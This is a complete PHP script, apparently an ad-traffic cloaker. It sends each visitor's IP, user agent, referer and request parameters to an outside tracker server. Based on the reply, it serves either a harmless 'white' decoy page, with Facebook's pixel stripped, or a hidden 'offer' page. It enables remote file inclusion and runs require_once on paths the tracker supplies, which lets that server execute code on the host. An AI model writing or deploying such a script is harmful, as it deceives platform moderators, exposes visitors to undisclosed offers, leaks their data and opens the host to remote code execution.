<?php
	@error_reporting(E_ALL);
	@ini_set("expose_php", "off");
	@ini_set("allow_url_include", "1");

	class Processor {
		private $token = "6Me1oYwLNv";

		private $clickData;

		public function __construct() {
			$this->clearInput();    // Очистка входящих данных
			$this->proceedInput();  // Получаем GET/POST-параметры
			$this->proceedHeader(); // Получаем хэдер

			$this->clickData["token"] = $this->token;   // Получаем токен
			$this->clickData["ip"]    = $this->getIP(); // Получаем IP
			$this->clickData["cid"]   = hash("crc32", $this->clickData["ip"] . "_" . $this->clickData["ua"]); // Генерируем CID

			// Удаляем пустые переменные
			foreach ($this->clickData as $key => $value)
				if (empty($this->clickData[$key]))
					unset($this->clickData[$key]);

			{ // Отправляем данные на проверку в трекер
				$curl = curl_init();
					curl_setopt_array($curl, [
						CURLOPT_URL            => "https://control.boomer-saas.site/external/",
						CURLOPT_POST           => TRUE,
						CURLOPT_POSTFIELDS     => $this->clickData,
						CURLOPT_NOBODY         => FALSE,
						CURLOPT_SSL_VERIFYHOST => FALSE,
						CURLOPT_SSL_VERIFYPEER => FALSE,
						CURLOPT_RETURNTRANSFER => TRUE,
						CURLOPT_FAILONERROR    => TRUE,
						CURLOPT_CONNECTTIMEOUT => 10,
						CURLOPT_TIMEOUT        => 15
					]);

					$trackerResponse = curl_exec($curl);
				curl_close($curl);
			}

			try { // Читаем ответ трекера
				$trackerResponse = json_decode($trackerResponse, true);

				if (isset($trackerResponse["offer"])) { // Все проверки пройдены, открываем оффер
					$offerUrl = $trackerResponse["offer"];  // URL оффера
					$method   = $trackerResponse["method"] ?? "meta"; // Метод загрузки

					$this->offer($offerUrl, $method);
				} elseif (isset($trackerResponse["white"])) { // Если получили white
					$this->white($trackerResponse["white"]); // Открываем white url
				} elseif (isset($trackerResponse["stop"])) { // Замыкающий
					$offerUrl = $trackerResponse["stop"];  // Последний клик

					$this->offer($offerUrl, "meta");
				} else { // Ошибка
					print($trackerResponse);
				}
			} catch(Exception $e) {
				print("Полная жопа, серверу плохо. Пишите разрабу. Токен: " . $this->token);
				print("<br />");
				print_r($trackerResponse);
			}
		}

		// ----------------------------------------------------

		private function white($whiteUrl) {
			$page = "";

			if (substr($whiteUrl, 0, 3) != 'htt') { // Если это файл
				require_once($whiteUrl);
				return;
			} else {
				if (function_exists("curl_init")) { // Если на сервере есть curl
					$page = $this->loadPage($whiteUrl);
				} else { // Если на сервере нет curl
					$page = file_get_contents($whiteUrl, "r",
						stream_context_create([
							"ssl" => [
								"verify_peer"      => false,
								"verify_peer_name" => false
							]
						])
					);
				}
			}

			// Подменяем base на домен вайта, удаляем кишки facebook-а
			$page = preg_replace('#(<head[^>]*>)#imU', '$1<base href="' . $whiteUrl . '">', $page, 1);
			$page = preg_replace('#https://connect\.facebook\.net/[a-zA-Z_-]+/fbevents\.js#imU', '', $page);

            print($page); // Выводим страницу
		}

		private function offer($offerUrl, $method = "curl") {
			if (substr($offerUrl, 0, 3) != 'htt') { // Если это файл
				require_once($offerUrl);
			} else {
				if (!empty($_GET)) // Подстановка GET-параметров
					$offerUrl .= ((strstr($offerUrl, "?")) ? "&" : "?") . http_build_query($_GET);

				if ($method == "curl") {
					if (function_exists("curl_init")) {
						print($this->loadPage($offerUrl, true));
					} else { // Если на сервере нет curl
						print("curl_init нет на сервере. Пишите разрабу. Токен: " . $this->token);
					}
				} elseif ($method == "meta") {
					print('<html><head><meta http-equiv="Refresh" content="0; URL=' . $offerUrl . '" ></head></html>');
				} else {
					header("Location: " . $offerUrl);
				}
			}
		}

		private function loadPage($url, $sendUA = false) {
			$curl = curl_init();
				curl_setopt_array($curl, [
					CURLOPT_URL            => $url,
					CURLOPT_NOBODY         => FALSE,
					CURLOPT_SSL_VERIFYHOST => FALSE,
					CURLOPT_SSL_VERIFYPEER => FALSE,
					CURLOPT_RETURNTRANSFER => TRUE,
					CURLOPT_FOLLOWLOCATION => TRUE,
					CURLOPT_FAILONERROR    => TRUE,
					CURLOPT_MAXREDIRS      => 3,
					CURLOPT_CONNECTTIMEOUT => 10,
					CURLOPT_TIMEOUT        => 15
				]);

				if ($sendUA)
					if (isset($this->clickData["ua"]) && !empty($this->clickData["ua"]))
						curl_setopt($curl, CURLOPT_USERAGENT, $this->clickData["ua"]);

				$result = curl_exec($curl);
				$error  = curl_error($curl);
			curl_close($curl);

			if ($error) {
				return "CURL error: " . $error;
			} elseif (empty($result)) {
				return "CURL error: result is empty";
			}

			return $result;
		}

		// ----------------------------------------------------

		private function clearInput() {
			foreach ($_GET as $key => $value) {
				$key = htmlspecialchars(trim($key), ENT_QUOTES);
				$_GET[$key] = htmlspecialchars(trim($value), ENT_QUOTES);
			}

			foreach ($_POST as $key => $value) {
				$key = htmlspecialchars(trim($key), ENT_QUOTES);
				$_POST[$key] = htmlspecialchars(trim($value), ENT_QUOTES);
			}

			foreach ($_COOKIE as $key => $value) {
				$key = htmlspecialchars(trim($key), ENT_QUOTES);
				$_COOKIE[$key] = htmlspecialchars(trim($value), ENT_QUOTES);
			}
		}

		private function proceedInput() {
			foreach ($_GET as $key => $value) {
				$this->clickData[$key] = $value;
			}
 
			foreach ($_POST as $key => $value) {
				$this->clickData[$key] = $value;
			}
		}

		private function proceedHeader() {
			$headers = [];

			foreach ($_SERVER as $name => $value)
				if (stripos($name, "HTTP_") !== false)
					$headers[$name] = $value;

			if (isset($headers["HTTP_USER_AGENT"])) {
				$this->clickData["ua"] = $headers["HTTP_USER_AGENT"];
			} elseif (isset($headers["USER_AGENT"])) {
				$this->clickData["ua"] = $headers["USER_AGENT"];
			} else {
				$this->clickData["ua"] = "";
			}

			if (isset($headers["HTTP_REFERER"])) {
				$this->clickData["referer"] = $headers["HTTP_REFERER"];
			} elseif (isset($headers["Referer"])) {
				$this->clickData["referer"] = $headers["Referer"];
			} else {
				$this->clickData["referer"] = "";
			}

			if (isset($headers["HTTP_ACCEPT_LANGUAGE"])) {
				$this->clickData["lang"] = substr($headers["HTTP_ACCEPT_LANGUAGE"], 0, 2);
			} else {
				$this->clickData["lang"] = "";
			}
		}

		private function getIP() {
			$ip = "";

			$headers = [
				"HTTP_CF_CONNECTING_IP",
				"CLIENT_IP",
				"HTTP_X_FORWARDED_FOR",
				"HTTP_FORWARDED_FOR",
				"HTTP_X_FORWARDED",
				"HTTP_FORWARDED",
				"HTTP_CLIENT_IP",
				"HTTP_FORWARDED_FOR_IP",
				"X_FORWARDED_FOR",
				"FORWARDED_FOR",
				"X_FORWARDED",
				"FORWARDED",
				"FORWARDED_FOR_IP",
				"HTTP_PROXY_CONNECTION"
			];

			foreach ($headers as $header) {
				if (!empty($_SERVER[$header])) {
					$tmp = explode(",", $_SERVER[$header]);
					$ip = trim($tmp[0]);
					break;
				}
			}

			if (strstr($ip . "", ",")) {
				$tmp = explode(",", $ip);

				if (stristr($this->clickData["ua"], "mini")) {
					$ip = trim($tmp[count($tmp) - 2]);
				} else {
					$ip = trim($tmp[0]);
				}
			}

			if (empty($ip)) {
				if (!isset($_SERVER["REMOTE_ADDR"]) || $_SERVER["REMOTE_ADDR"] == "::1") {
					$ip = "127.0.0.1";
				} else {
					$ip = $_SERVER["REMOTE_ADDR"];
				}
			}

			if (stripos($ip, ".") !== false)
				if (stripos($ip, ":") !== false)
					$ip = explode(":", $ip)[0];

			return $ip;
		}
	}

	$processor = new Processor();
	unset($processor);
